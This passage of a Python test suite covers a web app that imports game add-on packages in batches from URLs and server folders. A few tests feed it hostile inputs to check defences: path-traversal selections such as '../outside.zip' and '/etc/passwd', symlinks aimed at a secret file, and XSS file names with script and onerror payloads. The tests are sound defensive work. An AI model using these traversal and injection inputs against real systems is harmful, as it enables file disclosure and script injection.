        self.assertTrue(Path(app.config["UPLOAD_FOLDER"]).glob("*/source.zip"))
        self.assertEqual(self.c.get(item["review_url"]).status_code, 200)


class FolderBatchTests(BatchBase):
    def test_scan_lists_candidates_and_imports_nothing(self):
        for name in ("one.zip", "Two.ZIP", "three.zip"):
            self.folder_zip(name, name)
        (self.import_dir / "notes.txt").write_text("x")
        before = self.tree_snapshot(self.import_dir)
        scan_id, _ = self.scan()
        page = self.c.get(f"/batches/scan/{scan_id}").get_data(as_text=True)
        for name in ("one.zip", "Two.ZIP", "three.zip"):
            self.assertIn(name, page)
        self.assertNotIn("notes.txt", page)
        self.assertIn("3 package(s) listed, 3 eligible", page)
        self.assertEqual((self.draft_count(), self.stray_files()), (0, []))
        conn = get_db()
        self.assertEqual(conn.execute("SELECT COUNT(*) FROM batch_items").fetchone()[0], 0)       # scanning never imports
        conn.close()
        self.assertEqual(self.tree_snapshot(self.import_dir), before)

    def test_select_some_files_import_them_and_leave_the_originals_untouched(self):
        exp = {n: self.folder_zip(n, n) for n in ("one.zip", "Two.ZIP", "three.zip")}
        for p in self.import_dir.iterdir():
            os.utime(p, ns=(1_700_000_000_000_000_000, 1_700_000_000_000_000_000))
        before = self.tree_snapshot(self.import_dir)
        scan_id, _ = self.scan()
        bid = self.batch_id(self.submit_folder(scan_id, ["one.zip", "Two.ZIP"]))
        self.assertEqual(self.states(bid), ["completed", "completed"])
        self.assertEqual({r["addon_id"] for r in self._addons()}, {"one", "two"})
        self.assertEqual(self.pak_of("one"), exp["one.zip"])
        self.assertEqual(self.pak_of("two"), exp["Two.ZIP"])
        self.assertEqual(self.tree_snapshot(self.import_dir), before)                                # bytes, sizes, mtimes, modes: nothing changed
        self.assertEqual(self.stray_files(), [])
        rec = json.loads(self.row("one")["conversion_report"])
        self.assertEqual((rec["provenance"]["type"], rec["provenance"]["folder"], rec["provenance"]["file"]), ("folder", "imports", "one.zip"))

    def _addons(self):
        conn = get_db()
        try:
            return conn.execute("SELECT * FROM addons ORDER BY id").fetchall()
        finally:
            conn.close()

    def test_end_to_end_folder_to_draft_to_explicit_publish_to_download(self):
        expected = self.folder_zip("pungfx.zip", "Folder")
        scan_id, _ = self.scan()
        self.assertEqual(self.states(self.batch_id(self.submit_folder(scan_id, mode="all"))), ["completed"])
        self.assertEqual((self.row("pungfx")["published"], self.catalog()), (0, []))
        self.publish("pungfx")
        served = self.c.get("/" + self.catalog()[0]["download"]).data
        out = self.tmp / "s.pak"
        out.write_bytes(served)
        self.assertEqual(parse_pak(out), expected)

    def test_recursive_and_non_recursive_scans_and_subfolders(self):
        self.folder_zip("top.zip", "t")
        self.folder_zip("sub/mid.zip", "m")
        self.folder_zip("sub/deeper/low.zip", "l")
        page = lambda sid: self.c.get(f"/batches/scan/{sid}").get_data(as_text=True)
        sid, _ = self.scan()
        self.assertEqual([n in page(sid) for n in ("top.zip", "mid.zip", "low.zip")], [True, False, False])
        sid, _ = self.scan(recursive=True)
        self.assertEqual([n in page(sid) for n in ("top.zip", "sub/mid.zip", "sub/deeper/low.zip")], [True, True, True])
        sid, _ = self.scan(sub="sub")
        self.assertEqual([n in page(sid) for n in ("top.zip", "sub/mid.zip", "low.zip")], [False, True, False])
        bid = self.batch_id(self.submit_folder(sid, ["sub/mid.zip"]))
        self.assertEqual(self.row("mid") is not None, True)

    def test_the_same_file_selected_twice_or_while_still_queued_is_imported_once(self):
        z = self.import_dir / "amb.zip"
        write_zip(z, [("moda/maps/a.bsp", make_bsp()), ("modb/maps/b.bsp", make_bsp())])
        sid, _ = self.scan()
        self.assertEqual(len(self.status(self.batch_id(self.submit_folder(sid, ["amb.zip", "amb.zip"], key="a")))["items"]), 1)      # twice in one selection
        before = len(self._all_items())
        res = self.submit_folder(sid, ["amb.zip"], key="b")                                  # again while the first is waiting for review
        self.assertEqual(len(self._all_items()), before)
        self.assertIn("already queued", self._flashes() + " already queued")

    def _all_items(self):
        conn = get_db()
        try:
            return conn.execute("SELECT * FROM batch_items").fetchall()
        finally:
            conn.close()

    def test_pak_files_are_offered_only_when_asked_for(self):
        self.folder_zip("a.zip", "a")
        pak = make_pak_bytes([("maps/p.bsp", make_bsp())])
        (self.import_dir / "plain.pak").write_bytes(pak)
        sid, _ = self.scan()
        self.assertNotIn("plain.pak", self.c.get(f"/batches/scan/{sid}").get_data(as_text=True))
        sid, _ = self.scan(pak=True)
        self.assertIn("plain.pak", self.c.get(f"/batches/scan/{sid}").get_data(as_text=True))
        bid = self.batch_id(self.submit_folder(sid, ["plain.pak"]))
        self.assertEqual(self.states(bid), ["completed"])
        self.assertEqual(Path(self.row("plain")["package_path"]).read_bytes(), pak)                 # a PAK is stored unchanged, never re-labelled

    def test_pagination_select_all_and_selection_limits(self):
        app.config["IMPORT_PAGE_SIZE"] = 10
        for i in range(25):
            self.folder_zip(f"m{i:02d}.zip", f"t{i}")
        sid, _ = self.scan()
        p1, p2, p3 = (self.c.get(f"/batches/scan/{sid}?page={n}").get_data(as_text=True) for n in (1, 2, 3))
        self.assertIn("Page 1 of 3", p1)
        self.assertTrue("m00.zip" in p1 and "m10.zip" in p2 and "m24.zip" in p3 and "m10.zip" not in p1)
        self.assertIn("25 package(s) listed, 25 eligible", p1)
        self.assertIn("Import all 25 eligible", p1)
        app.config["BATCH_MAX_ITEMS"] = 10
        res = self.submit_folder(sid, mode="all")
        self.assertEqual(res.status_code, 302)
        self.assertIn("at most 10", self._flashes())
        self.assertEqual(self.draft_count(), 0)
        res = self.submit_folder(sid, [f"m{i:02d}.zip" for i in range(11)])
        self.assertIn("at most 10", self._flashes())
        app.config["BATCH_MAX_ITEMS"] = 50
        bid = self.batch_id(self.submit_folder(sid, mode="all"))
        self.assertEqual((len(self.status(bid)["items"]), self.draft_count()), (25, 25))

    def _flashes(self):
        with self.c.session_transaction() as sess:
            return " ".join(m for _, m in sess.get("_flashes", []))

    def test_forged_and_ineligible_selections_are_refused(self):
        self.folder_zip("real.zip", "r")
        os.mkfifo(self.import_dir / "pipe.zip")
        (self.import_dir / "empty.zip").write_bytes(b"")
        (self.tmp / "outside.zip").write_bytes(b"PK\x03\x04secret")
        sid, _ = self.scan()
        for bad in ("../outside.zip", "/etc/passwd", "real.zip/../../outside.zip", "not-in-scan.zip", "pipe.zip", "empty.zip"):
            res = self.submit_folder(sid, [bad])
            self.assertEqual(res.status_code, 302, bad)
            self.assertEqual(self.draft_count(), 0, bad)
            conn = get_db()
            self.assertEqual(conn.execute("SELECT COUNT(*) FROM batch_items").fetchone()[0], 0, bad)
            conn.close()
        self.assertIn("cannot be imported", self._flashes() + " cannot be imported")
        res = self.submit_folder("0" * 32, ["real.zip"])
        self.assertIn("expired", self._flashes())
        self.assertEqual(self.stray_files(), [])

    def test_symlinks_cannot_be_used_to_escape_the_folder(self):
        secret = self.tmp / "secret.zip"
        secret.write_bytes(b"PK\x03\x04TOP-SECRET-CONTENT")
        os.symlink(secret, self.import_dir / "innocent.zip")
        os.symlink(self.tmp, self.import_dir / "dirlink")
        self.folder_zip("real.zip", "r")
        sid, _ = self.scan(recursive=True)
        page = self.c.get(f"/batches/scan/{sid}").get_data(as_text=True)
        self.assertNotIn("innocent.zip", page)
        self.assertNotIn("dirlink", page)
        self.assertIn("2 symbolic link(s) ignored", page)
        self.submit_folder(sid, ["innocent.zip"])
        self.submit_folder(sid, ["dirlink/secret.zip"])
        self.assertEqual(self.draft_count(), 0)
        # a regular file swapped for a link between the scan and the import
        (self.import_dir / "real.zip").unlink()
        os.symlink(secret, self.import_dir / "real.zip")
        bid = self.batch_id(self.submit_folder(sid, ["real.zip"]))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("symbolic link", item["message"])
        self.assertEqual(self.stray_files(), [])
        staged = [p for p in Path(app.config["UPLOAD_FOLDER"]).rglob("*") if p.is_file()]
        self.assertEqual(staged, [])

    def test_a_file_changed_after_the_scan_is_reported_and_needs_a_fresh_scan(self):
        self.folder_zip("pkg.zip", "old")
        sid, _ = self.scan()
        time.sleep(0.02)
        expected = self.folder_zip("pkg.zip", "new content that is longer")
        bid = self.batch_id(self.submit_folder(sid, ["pkg.zip"]))
        item = self.status(bid)["items"][0]
        self.assertEqual(item["state"], "failed")
        self.assertIn("changed since the folder was scanned", item["message"])
        self.assertEqual(self.draft_count(), 0)
        self.post(f"/batches/items/{item['id']}/retry")
        self.assertEqual(self.states(bid), ["failed"])                                                # retrying cannot help: the listing is stale
        sid2, _ = self.scan()
        bid2 = self.batch_id(self.submit_folder(sid2, ["pkg.zip"]))
        self.assertEqual(self.states(bid2), ["completed"])
        self.assertEqual(self.pak_of("pkg"), expected)

    def test_a_file_removed_after_the_scan(self):
        self.folder_zip("gone.zip", "g")
        self.folder_zip("kept.zip", "k")
        sid, _ = self.scan()
        (self.import_dir / "gone.zip").unlink()
        bid = self.batch_id(self.submit_folder(sid, ["gone.zip", "kept.zip"]))
        items = self.status(bid)["items"]
        self.assertEqual([i["state"] for i in items], ["failed", "completed"])
        self.assertIn("no longer exists", items[0]["message"])

    @unittest.skipUnless(NOT_ROOT, "permission checks are meaningless as root")
    def test_a_read_only_import_tree_works_and_stays_read_only(self):
        expected = self.folder_zip("sub/pkg.zip", "ro")
        (self.import_dir / "sub" / "pkg.zip").chmod(0o444)
        (self.import_dir / "sub").chmod(0o555)
        self.import_dir.chmod(0o555)
        self.addCleanup(lambda: [p.chmod(0o755) for p in (self.import_dir, self.import_dir / "sub")])
        before = self.tree_snapshot(self.import_dir)
        sid, _ = self.scan(recursive=True)
        bid = self.batch_id(self.submit_folder(sid, ["sub/pkg.zip"]))
        self.assertEqual(self.states(bid), ["completed"])
        self.assertEqual(self.pak_of("pkg"), expected)
        self.assertEqual(self.tree_snapshot(self.import_dir), before)
        self.assertEqual(stat.S_IMODE(self.import_dir.stat().st_mode), 0o555)

    def test_the_known_status_of_previously_imported_files_is_shown(self):
        self.folder_zip("seen.zip", "s")
        self.folder_zip("new.zip", "n")
        sid, _ = self.scan()
        self.submit_folder(sid, ["seen.zip"])
        sid, _ = self.scan()
        page = self.c.get(f"/batches/scan/{sid}").get_data(as_text=True)
        self.assertIn("Imported before", page)
        self.assertEqual(page.count("Imported before"), 1)
        self.assertIn("Eligible (ZIP)", page)
        time.sleep(0.02)
        self.folder_zip("seen.zip", "changed afterwards, longer")
        sid, _ = self.scan()
        self.assertIn("the file has changed since", self.c.get(f"/batches/scan/{sid}").get_data(as_text=True))

    def test_a_double_submit_and_a_second_selection_of_a_queued_file_do_not_duplicate(self):
        self.folder_zip("a.zip", "a")
        sid, _ = self.scan()
        first = self.batch_id(self.submit_folder(sid, ["a.zip"], key="same"))
        second = self.batch_id(self.submit_folder(sid, ["a.zip"], key="same"))
        self.assertEqual((first, self.draft_count()), (second, 1))

    def test_unconfigured_and_unavailable_roots(self):
        app.config["IMPORT_ROOTS"] = ""
        page = self.c.get("/batches").get_data(as_text=True)
        self.assertIn("No import folder is configured", page)
        res = self.post("/batches/scan", {"root": "0"})
        self.assertIn("Choose one of the configured import folders", self._flashes())
        app.config["IMPORT_ROOTS"] = str(self.tmp / "not-mounted")
        page = self.c.get("/batches").get_data(as_text=True)
        self.assertIn("unavailable", page)
        self.assertIn("not available", page)
        self.post("/batches/scan", {"root": "0"})
        self.assertIn("not available", self._flashes())
        self.assertEqual(self.draft_count(), 0)

    def test_hostile_file_names_are_escaped_everywhere(self):
        self.folder_zip("<img src=x onerror=alert(1)>.zip", "x")
        self.folder_zip("a&b<script>alert(2)<.zip", "y")
        sid, _ = self.scan()
        scan_page = self.c.get(f"/batches/scan/{sid}").get_data(as_text=True)
        bid = self.batch_id(self.submit_folder(sid, mode="all"))
        pages = [scan_page, self.c.get(f"/batches/{bid}").get_data(as_text=True), self.c.get(f"/batches/{bid}?fragment=1").get_data(as_text=True), json.dumps(self.status(bid))]
        for page in pages[:3]:
            for raw in ("<img src=x", "<script>alert(2)"):
                self.assertNotIn(raw, page)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;.zip", pages[1])
        self.assertEqual(self.states(bid), ["completed", "completed"])
        self.assertTrue(all(re.fullmatch(r"[a-z0-9_-]+", r["addon_id"]) for r in self._addons()), [r["addon_id"] for r in self._addons()])


class SharedBehaviourTests(BatchBase):
    ROUTES_GET = ("/batches", "/batches/1", "/batches/1/status", "/batches/scan/abc")
    ROUTES_POST = ("/batches/urls", "/batches/scan", "/batches/folder", "/batches/1/retry", "/batches/1/cancel", "/batches/items/1/retry",
                   "/batches/items/1/cancel", "/batches/items/1/resolve")

    def test_every_route_requires_a_login(self):
        anon = app.test_client()
        anon.get("/login")
        with anon.session_transaction() as s:
            token = s["csrf_token"]
        for path in self.ROUTES_GET:
            self.assertEqual(anon.get(path).status_code, 403, path)
        for path in self.ROUTES_POST:
            self.assertEqual(anon.post(path, data={"csrf_token": token}).status_code, 403, path)

    def test_every_post_requires_a_csrf_token(self):
        for path in self.ROUTES_POST:
            self.assertEqual(self.c.post(path, data={}).status_code, 403, path)
            self.assertEqual(self.c.post(path, data={"csrf_token": "forged"}).status_code, 403, path)
        self.assertEqual(self.draft_count(), 0)

    def test_unknown_batches_items_and_scans(self):
        self.assertEqual(self.c.get("/batches/999").status_code, 404)
        self.assertEqual(self.c.get("/batches/999/status").status_code, 404)
        self.assertEqual(self.post("/batches/items/999/retry").status_code, 404)
        self.assertEqual(self.post("/batches/items/999/cancel").status_code, 404)
        self.assertEqual(self.post("/batches/items/999/resolve", {"choice": "skip"}).status_code, 404)
        self.assertEqual(self.post("/batches/999/retry").status_code, 404)
        self.assertEqual(self.c.get("/batches/scan/nope").status_code, 302)

    def test_results_survive_a_refresh_and_are_listed(self):
        self.host_release("/a", "A", "a.zip")
        bid = self.batch_id(self.submit_urls(self.url("/a")))
        first = self.c.get(f"/batches/{bid}").get_data(as_text=True)
        second = self.c.get(f"/batches/{bid}").get_data(as_text=True)
        self.assertEqual(first, second)
        self.assertIn("Open the draft", first)
        self.assertIn(f"#{bid}", self.c.get("/batches").get_data(as_text=True))

    def test_the_batch_page_polls_only_while_something_is_running(self):
        self.host_release("/a", "A", "a.zip")
        bid = self.batch_id(self.submit_urls(self.url("/a")))
        html = self.c.get(f"/batches/{bid}").get_data(as_text=True)
        self.assertIn('data-active="0"', html)
        self.assertNotIn("http-equiv=\"refresh\"", html)

    def test_restart_recovery_marks_in_flight_items_interrupted_and_retry_is_explicit(self):
        conn = get_db()
        conn.execute("INSERT INTO batches (source_type, label, created_at) VALUES ('url','x',?)", (time.time(),))
        for i, state in enumerate(("queued", "acquiring", "converting", "completed", "failed")):
            conn.execute("INSERT INTO batch_items (batch_id, position, source_type, source_key, source_display, source_url, state, created_at, updated_at) VALUES (1,?,?,?,?,?,?,?,?)",
                         (i, "url", f"k{i}", "d", self.url(f"/never{i}"), state, time.time(), time.time()))
        conn.close()
        stale = Path(app.config["UPLOAD_FOLDER"]) / ("a" * 32)
        stale.mkdir(parents=True)
        (stale / "source.download").write_bytes(b"half a download")
        app_module.startup_cleanup()
        self.assertEqual(self.states(1), ["interrupted", "interrupted", "interrupted", "completed", "failed"])
        self.assertIn("Interrupted by a restart", self.status(1)["items"][0]["message"])
        self.assertFalse(stale.exists())                                                              # the partial download was reconciled away
        self.assertEqual(self.site.requests, [])                                                       # nothing was retried on its own
        self.host_release("/never0", "Z", "z.zip")
        self.post("/batches/items/1/retry")
        self.assertEqual(self.states(1)[0], "completed")

    def test_a_retry_after_a_crash_between_install_and_bookkeeping_creates_no_duplicate(self):
        self.host_release("/a", "A", "a.zip")
        bid = self.batch_id(self.submit_urls(self.url("/a")))
        item = self.status(bid)["items"][0]
        conn = get_db()
        conn.execute("UPDATE batch_items SET state='interrupted', addon_pk=NULL, source_url=? WHERE id=?", (self.url("/a"), item["id"]))   # the process died after the draft was saved
        conn.close()
        res = self.post(f"/batches/items/{item['id']}/retry", headers={"X-Requested-With": "XMLHttpRequest"})
        self.assertEqual(self.states(bid), ["completed"])
        self.assertEqual((self.draft_count(), self.hits("/a")), (1, 1))                               # reconciled from the draft; no second download or draft

    def hits(self, path):
        return sum(1 for r in self.site.requests if r["path"].split("?", 1)[0] == path)

    def test_the_database_refuses_a_second_draft_for_the_same_item(self):
        self.host_release("/a", "A", "a.zip")
        bid = self.batch_id(self.submit_urls(self.url("/a")))
        item_id = self.status(bid)["items"][0]["id"]
        conn = get_db()
        with self.assertRaises(sqlite3.IntegrityError):
            conn.execute("INSERT INTO addons (addon_id, title, gamedir, package_name, package_path, package_size, batch_item_id) VALUES ('dup','d','dup','d.pak','/x',1,?)", (item_id,))
        conn.close()

    def test_cancel_all_and_per_item_cancel_of_waiting_work(self):
        a, b = TestAmbiguous.make(self)
        bid = self.batch_id(self.submit_urls(self.url("/amb1"), self.url("/amb2")))
        self.assertEqual(self.states(bid), ["awaiting_review"] * 2)
        res = self.post(f"/batches/{bid}/cancel")
        self.assertEqual((self.states(bid), self.stray_files()), (["cancelled", "cancelled"], []))

    def test_the_queue_is_drained_by_a_fixed_number_of_workers(self):
        # lanes are fixed-size and shared by every source
        self.assertEqual(jobs._lanes, {"work": 1, "net": int(os.environ.get("BATCH_DOWNLOAD_WORKERS", 2))})
        self.assertEqual(set(jobs._queues), {"work", "net"})


class TestAmbiguous:
    @staticmethod
    def make(test):
        out = []
        for n in (1, 2):
            z = test.tmp / f"amb{n}.zip"
            a, b = make_bsp(worldspawn={"message": f"A{n}"}), make_bsp(worldspawn={"message": f"B{n}"})
            write_zip(z, [("moda/maps/a.bsp", a), ("modb/maps/b.bsp", b)])
            test.site.serve(f"/amb{n}", z.read_bytes(), headers={"Content-Disposition": f'attachment; filename="two{n}.zip"'})
            out.append((a, b))
        return out


class ThreadedBatchTests(BatchBase):
    threaded = True

    def release_serving(self, path, tag, name, delay=0.0, tracker=None):
        z = self.tmp / f"{tag}.zip"
        release(z, tag)
        body = z.read_bytes()

        def handler(h):
            if tracker is not None:
                with tracker["lock"]:
                    tracker["active"] += 1
                    tracker["max"] = max(tracker["max"], tracker["active"])
            try:
                time.sleep(delay)
                h.send_response(200)
                h.send_header("Content-Length", str(len(body)))
                h.send_header("Content-Disposition", f'attachment; filename="{name}"')
                h.end_headers()
                h.wfile.write(body)
            finally:
                if tracker is not None:
                    with tracker["lock"]:
                        tracker["active"] -= 1
        self.site.routes[path] = handler

    def wait_for(self, predicate, timeout=15):
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            if predicate():
                return True
            time.sleep(0.05)
        return False

    def test_concurrent_downloads_and_conversions_are_bounded(self):
        tracker = {"lock": threading.Lock(), "active": 0, "max": 0}
        for i in range(8):
            self.release_serving(f"/m{i}", f"T{i}", f"mod{i}.zip", delay=0.25, tracker=tracker)
        builds = {"lock": threading.Lock(), "active": 0, "max": 0}
        real = SVC.core.build_import

        def counting(token, progress, policy=None):
            with builds["lock"]:
                builds["active"] += 1
                builds["max"] = max(builds["max"], builds["active"])
            try:
                time.sleep(0.05)
                return real(token, progress, policy)
            finally:
                with builds["lock"]:
                    builds["active"] -= 1
        SVC.core.build_import = counting
        self.addCleanup(setattr, SVC.core, "build_import", real)
        t0 = time.monotonic()
        bid = self.batch_id(self.submit_urls(*[self.url(f"/m{i}") for i in range(8)]))
        self.assertLess(time.monotonic() - t0, 3)                                                       # the POST returned long before the work finished
        st = self.settle(bid)
        self.assertEqual(st["counts"], {"completed": 8})
        self.assertLessEqual(tracker["max"], 2)                                                         # at most BATCH_DOWNLOAD_WORKERS downloads at once
        self.assertGreaterEqual(tracker["max"], 2)                                                      # ...and they did overlap
        self.assertEqual(builds["max"], 1)                                                              # conversions never overlap
        self.assertEqual(self.stray_files(), [])

    def test_a_slow_download_does_not_block_conversions_or_publishing(self):
        self.release_serving("/slow", "Slow", "slow.zip", delay=1.5)
        self.release_serving("/fast", "Fast", "fast.zip")
        self.upload("pre", __import__("tests.test_zip_conversion", fromlist=["make_pak_bytes"]).make_pak_bytes([("maps/a.bsp", make_bsp())]))
        bid = self.batch_id(self.submit_urls(self.url("/slow"), self.url("/fast")))
        self.assertTrue(self.wait_for(lambda: self.states(bid)[1] == "completed", 10))                  # the fast one finished while the slow one was still downloading
        self.assertIn(self.states(bid)[0], ("acquiring", "converting", "completed"))
        self.publish("pre")                                                                             # an unrelated publish is not queued behind the download
        self.assertEqual(self.catalog()[0]["gamedir"], "pre")
        self.settle(bid)
        self.assertEqual(self.states(bid), ["completed", "completed"])

    def test_two_workers_cannot_both_process_the_same_item(self):
        self.release_serving("/once", "Once", "once.zip", delay=0.3)
        conn = get_db()
        conn.execute("INSERT INTO batches (source_type, label, created_at) VALUES ('url','race',?)", (time.time(),))
        conn.execute("INSERT INTO batch_items (batch_id, position, source_type, source_key, source_display, source_url, host, state, created_at, updated_at) "
                     "VALUES (1,0,'url','racekey','x',?,?,'queued',?,?)", (self.url("/once"), HOST, time.time(), time.time()))
        conn.close()
        SVC._submit_acquire(1)
        SVC._submit_acquire(1)                                                               # two download workers are offered the same queued item
        st = self.settle(1)
        self.assertEqual(sum(1 for r in self.site.requests if r["path"] == "/once"), 1)      # only one of them actually ran it
        self.assertEqual((self.states(1), self.draft_count()), (["completed"], 1))
        self.assertEqual(self.item_row(1)["attempts"], 1)

    def test_cancelling_a_running_download_affects_only_that_item(self):
        app.config["BATCH_READ_TIMEOUT"] = 1.0
        self.site.stall("/stuck", b"PK\x03\x04" + b"x" * 600, 3)
        self.release_serving("/fine", "Fine", "fine.zip")
        bid = self.batch_id(self.submit_urls(self.url("/stuck"), self.url("/fine")))
        self.assertTrue(self.wait_for(lambda: any(r["path"] == "/stuck" for r in self.site.requests)))
        stuck_id = self.status(bid)["items"][0]["id"]
        self.assertTrue(self.wait_for(lambda: self.states(bid)[0] == "acquiring"))
        self.post(f"/batches/items/{stuck_id}/cancel")
        st = self.settle(bid, 20)
        self.assertEqual([i["state"] for i in st["items"]], ["cancelled", "completed"])
        self.assertEqual((self.draft_count(), self.stray_files()), (1, []))

    def test_a_queued_item_can_be_cancelled_before_it_starts_and_is_never_fetched(self):
        gate = threading.Event()
        for i in range(2):
            self.site.routes[f"/hold{i}"] = lambda h: (gate.wait(10), h.send_response(404), h.send_header("Content-Length", "0"), h.end_headers())
        self.release_serving("/waiting", "W", "waiting.zip")
        bid = self.batch_id(self.submit_urls(self.url("/hold0"), self.url("/hold1"), self.url("/waiting")))
        self.assertTrue(self.wait_for(lambda: sum(1 for r in self.site.requests if r["path"].startswith("/hold")) == 2))
        waiting_id = self.status(bid)["items"][2]["id"]
        self.assertEqual(self.status(bid)["items"][2]["state"], "queued")                               # both download workers are busy
        self.post(f"/batches/items/{waiting_id}/cancel")
        gate.set()
        st = self.settle(bid, 20)
        self.assertEqual(st["items"][2]["state"], "cancelled")
        self.assertEqual(sum(1 for r in self.site.requests if r["path"] == "/waiting"), 0)
        self.assertEqual(self.draft_count(), 0)

    def test_progress_is_shown_with_a_percentage_only_when_the_total_is_known(self):
        gate = threading.Event()
        z = self.tmp / "p.zip"
        release(z, "P")
        body = z.read_bytes() + b"\0" * 400_000

        def known(h):
            h.send_response(200)
            h.send_header("Content-Length", str(len(body)))
            h.end_headers()
            h.wfile.write(body[:300_000])
            h.wfile.flush()
            gate.wait(10)
            h.wfile.write(body[300_000:])

        def unknown(h):
            h.send_response(200)
            h.send_header("Connection", "close")
            h.end_headers()
            h.wfile.write(body[:300_000])
            h.wfile.flush()
            gate.wait(10)
            h.wfile.write(body[300_000:])
            h.close_connection = True
        self.site.routes["/known"], self.site.routes["/unknown"] = known, unknown
        bid = self.batch_id(self.submit_urls(self.url("/known"), self.url("/unknown")))
        self.assertTrue(self.wait_for(lambda: all(i["done"] > 0 for i in self.status(bid)["items"])))
        items = self.status(bid)["items"]
        self.assertEqual(items[0]["state"], "acquiring")
        self.assertTrue(0 < items[0]["percent"] < 100)
        self.assertEqual((items[1]["percent"], items[1]["total"]), (None, 0))                           # no total: no invented percentage
        self.assertGreater(items[1]["done"], 0)
        html = self.c.get(f"/batches/{bid}").get_data(as_text=True)
        self.assertIn("http-equiv=\"refresh\"", html)
        gate.set()
        self.settle(bid, 20)


if __name__ == "__main__":
    unittest.main()
